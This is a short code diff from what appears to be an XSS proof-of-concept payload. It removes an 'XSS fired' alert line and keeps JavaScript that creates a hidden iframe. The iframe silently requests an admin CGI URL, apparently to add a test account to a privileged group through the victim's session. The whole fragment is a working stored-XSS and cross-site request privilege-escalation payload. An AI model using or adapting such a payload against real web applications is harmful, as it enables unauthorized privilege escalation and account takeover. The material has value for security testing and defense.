@@ -1,4 +1,3 @@
-alert('XSS fired');
 const f = document.createElement('iframe');
 f.style.display = 'none';
 f.src = '/cgi-bin/admin/person/admin_profile.pl?pid=oslo_test&action=groupmembers&GroupID=6';
